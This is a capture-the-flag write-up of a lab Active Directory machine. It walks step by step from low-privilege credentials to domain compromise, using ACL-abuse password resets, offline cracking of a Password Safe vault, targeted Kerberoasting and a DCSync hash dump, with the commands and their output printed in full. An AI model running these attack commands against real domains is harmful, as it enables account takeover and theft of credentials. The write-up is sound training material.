---
target_ip:
os: Windows
difficulty: Medium
status:
date: 2026-06-15
---

# 🚩 Box Name: {{Administrator}}

## 📋 Initial Info
- **Hostname:** `target.htb`

## Machine Overview

Administrator is a medium-difficulty Active Directory machine that demonstrates how a series of misconfigured permissions can lead to a complete domain compromise. Starting with credentials for a low-privileged user, the attack path revolves around enumerating access control lists (ACLs) and identifying opportunities to abuse delegated permissions between user accounts.

The first breakthrough comes from discovering that one user has full control over another account, allowing a password reset and access to additional resources within the domain. As enumeration continues, each compromised account reveals new privileges and relationships that can be leveraged to gain access to the next user in the chain.

Along the way, an FTP server exposes a password safe backup containing credentials for multiple domain users. After recovering the stored passwords and validating them against the domain, access is gained to an account with permissions that enable further privilege escalation through targeted Kerberoasting.

The final stages of the attack focus on abusing Active Directory permissions to recover the credentials of a user with DCSync rights. With the ability to replicate domain secrets, the Administrator account hash can be extracted directly from the domain controller, resulting in full control of the environment.

Administrator is an excellent example of how seemingly minor permission misconfigurations can compound into a complete Active Directory takeover when proper delegation and access controls are not carefully managed.

As is common in real life Windows pentests, we start the Administrator box with credentials for the following account: 

Username: Olivia Password: ichliebedich

---

## 🔍 Reconnaissance

### 📡 Port Scanning (Nmap)
> [!TIP] Scan Command
> `sudo nmap -A -T4 -p- -oN nmap/initial <IP>`

#### Monster nmap scan

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-15 16:37 CDT
Nmap scan report for 10.129.13.134
Host is up (0.061s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-16 04:36:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
52161/tcp open  msrpc         Microsoft Windows RPC
52168/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52179/tcp open  msrpc         Microsoft Windows RPC
52184/tcp open  msrpc         Microsoft Windows RPC
52187/tcp open  msrpc         Microsoft Windows RPC
52201/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/15%OT=21%CT=1%CU=36550%PV=Y%DS=2%DC=T%G=Y%TM=6A30710
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=
OS:A)SEQ(SP=103%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=103%GCD=1%ISR
OS:=108%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=104%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS
OS:=S%TS=A)SEQ(SP=106%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M552NW8
OS:ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M55
OS:2ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T
OS:=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T
OS:2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O
OS:%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R
OS:D=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 6h58m42s
| smb2-time:
|   date: 2026-06-16T04:37:49
|_  start_date: N/A

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   60.21 ms 10.10.14.1
2   60.43 ms 10.129.13.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.26 seconds
```

Based on the scan this appears to be a Domain Controller. I'm going to start with SMB enumeration.

### 🌐 SMB Enumeration

The credentials work but I don't find anything interesting in the available Shares.

```shell
┌─[split@parrot:~/Documents/HTB/Administrator]
└─❯ nxc smb 10.129.13.134 -u olivia -p ichliebedich                                                                                                                           ──(Mon,Jun15)─┘
SMB         10.129.13.134   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.13.134   445    DC               [+] administrator.htb\olivia:ichliebedich
┌─[split@parrot:~/Documents/HTB/Administrator]
└─❯ nxc smb 10.129.13.134 -u olivia -p ichliebedich --shares                                                                                                                  ──(Mon,Jun15)─┘
SMB         10.129.13.134   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.13.134   445    DC               [+] administrator.htb\olivia:ichliebedich
SMB         10.129.13.134   445    DC               [*] Enumerated shares
SMB         10.129.13.134   445    DC               Share           Permissions     Remark
SMB         10.129.13.134   445    DC               -----           -----------     ------
SMB         10.129.13.134   445    DC               ADMIN$                          Remote Admin
SMB         10.129.13.134   445    DC               C$                              Default share
SMB         10.129.13.134   445    DC               IPC$            READ            Remote IPC
SMB         10.129.13.134   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.13.134   445    DC               SYSVOL          READ            Logon server share
```

### BloodHound

After importing the BloodHound data, the attack path started to reveal itself.

```shell
┌─[split@parrot:~/Documents/HTB/Administrator/Bloodhound_Data]
└─❯ rusthound-ce -d administrator.htb -i 10.129.13.134 -u olivia -p 'ichliebedich' -v                                                                                         ──(Mon,Jun15)─┘
---------------------------------------------------
Initializing RustHound-CE at 17:00:19 on 06/15/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-06-15T22:00:19Z INFO  rusthound_ce] Verbosity level: Debug
<SNIP>
[2026-06-15T22:00:26Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-06-15T22:00:26Z INFO  rusthound_ce::json::maker::common] .//20260615170026_administrator-htb_containers.json created!

RustHound-CE Enumeration Completed at 17:00:26 on 06/15/26! Happy Graphing!
```


At first glance, Olivia didn't look particularly dangerous. However, BloodHound showed that she belonged to the **Remote Management Users** group, which meant I could authenticate over WinRM and get an interactive shell on the target.

```shell
┌─[split@parrot:~/Documents/HTB/Administrator/Bloodhound_Data]
└─❯ nxc winrm 10.129.13.134 -u olivia -p ichliebedich                                                                                                                         ──(Mon,Jun15)─┘
WINRM       10.129.13.134   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.13.134   5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)
```

With working credentials confirmed, I went back to BloodHound to see what kind of damage Olivia could do.

I could install a tool such as PowerView and enumerate from Windows but since I already have BloodHound data I'm just going to keep it simple and use that.

#### Olivia → Michael

The first interesting relationship was that **Olivia has GenericAll rights over Michael**.

GenericAll is essentially the Active Directory equivalent of being handed someone's account keys. It grants full control over the target object, allowing actions such as resetting passwords, modifying attributes, and much more.


![[O to M BH.png]]


#### Michael → Benjamin

Following the graph further, Michael has **ForceChangePassword** rights over Benjamin.

Meaning if I can take over Michael, I can immediately take over Benjamin as well.

![[M to B BH.png]]


The attack path looked like this:

![[O to S BH.png]]


At this point I didn't see an obvious route to Domain Admin, but gaining access to additional accounts often uncovers new opportunities. Time to start collecting identities.

## ⚡ Exploitation (Initial Access)

### Resetting Michael's Password

Using Olivia's GenericAll permissions, I reset Michael's password.

```shell
┌─[split@parrot:~/Documents/HTB/Administrator]
└─❯ bloodyAD --host 10.129.13.134 -d administrator.htb -u olivia -p 'ichliebedich' set password michael 'Password123!'
[+] Password changed successfully!
```


Success.

Now that I controlled Michael, I used his ForceChangePassword rights against Benjamin.

```shell
┌─[split@parrot:~/Documents/HTB/Administrator]
└─❯ bloodyAD --host 10.129.13.134 -d administrator.htb -u michael -p 'Password123!' set password benjamin 'Password123!'
[+] Password changed successfully!
```

Success again.

Two account takeovers for the price of one.

### 📂 Benjamin's Secret FTP Stash


With Benjamin compromised, I started checking what services he could access.

One stood out immediately: **FTP**.

```shell
┌─[split@parrot:~/Documents/HTB/Administrator]
└─❯ ftp 10.129.13.134                                                         ──(Mon,Jun15)─┘
Connected to 10.129.13.134.
220 Microsoft FTP Service
Name (10.129.13.134:split): benjamin
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||51224|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> mget Backup.psafe3
mget Backup.psafe3 [anpqy?]? y
229 Entering Extended Passive Mode (|||51227|)
125 Data connection already open; Transfer starting.
100% |*************************************************|   952       14.91 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (14.85 KiB/s)
```

After logging in as Benjamin, I found a single file.

That extension looked familiar.

I downloaded the file and identified it using the `file` command.

```shell
┌─[split@parrot:~/Documents/HTB/Administrator]
└─❯ file Backup.psafe3                                                        ──(Mon,Jun15)─┘
Backup.psafe3: Password Safe V3 database
```

Interesting.

Someone has conveniently left behind an encrypted password vault.

#### Cracking the Password Safe Database

Password Safe databases can be attacked offline.

```shell
┌─[split@parrot:~/Documents/HTB/Administrator]
└─❯ hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt            ──(Mon,Jun15)─┘
hashcat (v6.2.6) starting

<SNIP>

Backup.psafe3:tekieromucho

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Mon Jun 15 17:55:43 2026 (1 sec)
Time.Estimated...: Mon Jun 15 17:55:44 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    25632 H/s (6.39ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5120/14344385 (0.04%)
Rejected.........: 0/5120 (0.00%)
Restore.Point....: 4608/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#1....: Liverpool -> babygrl
Hardware.Mon.#1..: Util:100%

Started: Mon Jun 15 17:55:29 2026
Stopped: Mon Jun 15 17:55:46 2026
```

A few seconds later Hashcat handed over the password:

`tekieromucho`

#### passwordsafe

I next installed `passwordsafe`

```shell
┌─[split@parrot:~/Documents/HTB/Administrator]
└─❯ sudo apt install passwordsafe 
```


After opening the database with Password Safe, I found another set of credentials:

![[emily DB passwd.png]]


`emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

At this point the attack path has evolved to Olivia → Michael → Benjamin → Emily

I have the credentials of 6 users. Emily is the most interesting since she has a directory on the machine. She has remote access so I use winrm to login to the machine.

### 🩸 Emily's Path to Domain Compromise

Back in BloodHound, Emily turned out to be far more interesting than the previous users.

She has **GenericWrite** permissions over Ethan.

Even better, Ethan possesses **DCSync rights**.

Anyone with DCSync privileges can impersonate a Domain Controller and request password hashes directly from Active Directory.

The only challenge is getting control of Ethan's account.


![[E to E.png]]


#### Verifying the Permissions

Looking through my notes I am able to perform a Targeted kerberoast attack with GenericWrite privileges over Ethan.

I confirmed Emily's permissions using `dacledit.py`.

```shell
┌─[split@parrot:~/Documents/HTB/Administrator]
└─❯ dacledit.py -principal emily -target ethan adminstrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.13.134
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1088858960-373806567-254189436-1112)
[*]   ACE[20] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE
[*]     Access mask               : ReadControl, WriteProperties, Self (0x20028)
[*]     Trustee (SID)             : emily (S-1-5-21-1088858960-373806567-254189436-1112)
```

The output confirms Emily can modify properties on Ethan's account.

That's all I needed.

### Targeted Kerberoasting

One useful abuse of GenericWrite is a technique known as **Targeted Kerberoasting**.

The idea is simple:

1. Add a temporary SPN to the target account.

2. Request a Kerberos service ticket for that SPN.

3. Extract the ticket hash.

4. Crack it offline.


Since the ticket is encrypted using the target user's password hash, recovering the plaintext password becomes possible if it's weak enough.

I used `targetedKerberoast.py` to automate the process.

The first attempt failed with a familiar Kerberos error:

```shell
┌─[split@parrot:~/Tools/targetedKerberoast]
└─❯ python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --request-user ethan --dc-ip 10.129.13.134 -o hash.txt
[*] Starting kerberoast attacks
[*] Attacking user (ethan)
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```


Kerberos is notoriously picky about time synchronization.

A quick time sync fixed the issue:

```shell
┌─[split@parrot:~/Tools/targetedKerberoast]
└─❯ sudo ntpdate 10.129.13.134                                                 ──(Mon,Jun15)─┘
[sudo] password for split:
2026-06-16 01:34:01.735226 (-0500) +25123.237019 +/- 0.032015 10.129.13.134 s1 no-leap
CLOCK: time stepped by 25123.237019
```


Running the attack again successfully produced a TGS hash for Ethan.

```shell
┌─[split@parrot:~/Tools/targetedKerberoast]
└─❯ python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --request-user ethan --dc-ip 10.129.13.134 -o hash.txt
[*] Starting kerberoast attacks
[*] Attacking user (ethan)
[+] Writing hash to file for (ethan)
```


#### 🔓 Cracking Ethan


I used Hashcat once again.

```shell
┌─[split@parrot:~/Documents/HTB/Administrator]
└─❯ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt                 ──(Tue,Jun16)─┘
hashcat (v6.2.6) starting

<SNIP>

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$4f059d1cbb948619fd1e6de4f7524db9$224b9fb909d156d5b02ff3539caee7fb8d28f3a02b0954ff600e00f9d294d36750196aa72a5abfa148cae5e9a89d429b8a9151102f96ffc7785582a49fb529c36625d20f7e85123f2fc6154d2a7b42dadff01b60a818678ea7f5f85fbeeacc8c76088bc59042664f44facccd57af02b536625863a978aa74be40f08d9ddcac6de07890bcc8a1fd13c9401f4813dfc243a09466ad857404f765609aed8ebed1e5ce4936a11a6f8fb8a24ba3dbf486a3d6bc36b5940a03d82dd366ac8f8ae1dfdffe2c5a46ed0ffe068899b448f907fd53bbd28fde24f6edc5711b07de5cfb2b86dfe58d5d58f7a6b8e5d500775a18f4af0137584ad937d54b7713de819dfe2d77188ff35f45d325bc1f2586f205391e51215dcb3337c4ef8fc3f380ddfd7a6b10e7a987f2a7e19861500d232812fcbffae99483868db619af6a14d365ddf1dd66c32e93652677b3f3afb80d42aa62945061624e4b566ea84ab79b01933186b237e9ef68d39afa61eb0d26f2c578d7024d955322841aafc8a1fc572aeaf0a7a3d3d5f0c7eefe95b0fbee2b1376fb0ed34c4b513ff0de6b4038e2248c79b0ae3b73779098a628aa3cb59b43bd1b15908d70b6c504b31a0616d5e593cd8c927383efdbb0cb10fedb46d7942b84044a89402a52070ad881332c7de3163d7b419dc20235b34c0f4c1f5dd7cbd6d32f600c144782daf868f15e3bfcfbd4ccb1929a012318023b1d2ce2871cfec81a9404264acde06d682c3b506eeb50362357fb1d6386eec940264ee02e9148fcf85b4ddfddb2c5053df4ef7867541f7b2f0e8278221cb2e165688df9808ad61e3dcbd0190b7df393078b7038e71b6bc7a02f24bef44db08852805572dec4277830402207c3cb2d2ee01b665fe0ce60fa877c9d33681a6bf70b542e75d2be0cdd00b59721443cc7893c81ad90706a7c3254f7827a2fc540bde5538a09b76d11db85ee19a25f7cc59f8b7fd94ae77c069a2f0f2033aa08e8701d1ac62ee7d4f4460ebec34a313c3f304cc8b45d3929f1ba844f49b04048e3fbf50435804bf6e9e71f0655deef11ae9aa5af0c056720393a5b20009b8b60801aacad28afb6339209246e0e3ad1690366c76adb6143021517fea20821f03747c955899f6469d49b473512b77118e03281b83d14dd353252a0450f478991141a9fcef159bfa462715b61870d6800e2e33f71cd69dea490e47af029faa62925743830d76f3f69cf4e0d66ba4bf34f8136dbf638e9dc24881d048d718c264ed0951dd1e15cfc966ba9b9e2031803140b221fffec2ce29dc512f25fe4bcf349196944aa0fdfa82e8d8f92d08048e24e6a3584ef0dcb0175f1e81adb9fe3bbbab1794f29b5a38b9867b66af2b19975be8461210078dec45627a7b5e8c659bee007511fe3c47f3c9500d920db61dad24391313daa2a1639269a502da26e876e49a66bb024e003f6f757de7d4a66c812b4b107bb7498cb4396bee92f7e2b4c873c1f8750b5626a7927bef20852b9e0845f7aa9b3ea306cf0053508d8330c08c986:limpbizkit

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....08c986
Time.Started.....: Tue Jun 16 01:36:32 2026 (0 secs)
Time.Estimated...: Tue Jun 16 01:36:32 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   400.4 kH/s (3.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> iheartyou
Hardware.Mon.#1..: Util: 99%

Started: Tue Jun 16 01:36:30 2026
Stopped: Tue Jun 16 01:36:34 2026
```


Apparently the domain's password policy was feeling particularly nostalgic.

Now I have credentials for a user with DCSync rights.

### 👑 DCSync to Domain Admin

Using Ethan's credentials, I performed a DCSync attack with Impacket's `secretsdump.py`.

```shell
┌─[split@parrot:~/Documents/HTB/Administrator]
└─❯ secretsdump.py -just-dc administrator.htb/ethan:limpbizkit@10.129.13.134   ──(Tue,Jun16)─┘
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:7a206ee05e894781b99a0175a7fe6f7e1242913b2ab72d0a797cc45968451142
administrator.htb\michael:aes128-cts-hmac-sha1-96:b0f3074aa15482dc8b74937febfa9c7e
administrator.htb\michael:des-cbc-md5:2586dc58c47c61f7
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:36cfe045bc49eda752ca34dd62d77285b82b8c8180c3846a09e4cb13468433a9
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:2cca9575bfa7174d8f3527c7e77526e5
administrator.htb\benjamin:des-cbc-md5:49376b671fadf4d6
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```

The attack succeeded immediately and returns the content of the domain's NTDS database, including the NTLM hashes for privileged accounts like Administrator.

At this point the domain is fully compromised.

Using the recovered Administrator credentials, I authenticated to the Domain Controller and verified my access.

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
```


The entire attack path looked like this:

```text
Olivia
  ↓ GenericAll
Michael
  ↓ ForceChangePassword
Benjamin
  ↓ Password Safe Vault
Emily
  ↓ GenericWrite
Ethan
  ↓ DCSync
Administrator
```

The real challenge was following the breadcrumbs and abusing each permission along the way.

The End